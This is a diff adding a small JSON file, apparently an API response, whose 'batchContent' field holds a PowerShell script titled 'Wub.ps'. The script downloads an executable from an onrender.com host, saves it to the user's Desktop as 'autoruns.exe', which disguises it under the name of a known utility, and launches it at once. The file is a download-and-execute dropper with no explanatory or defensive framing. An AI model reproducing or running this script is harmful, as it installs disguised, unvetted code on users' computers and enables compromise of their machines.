@@ -1,0 +1,5 @@
+{
+    "success": true,
+    "batchTitle": "Wub.ps",
+    "batchContent": "$desktopPath = [System.Environment]::GetFolderPath('Desktop')\nInvoke-WebRequest \"https://exmapi.onrender.com/static/premium/v1.1.2/Wub_x64.exe\" -Outfile \"$desktopPath\\autoruns.exe\";\nStart-Process -FilePath \"$desktopPath\\autoruns.exe\" -WorkingDirectory $desktopPath;\nexit"
+}
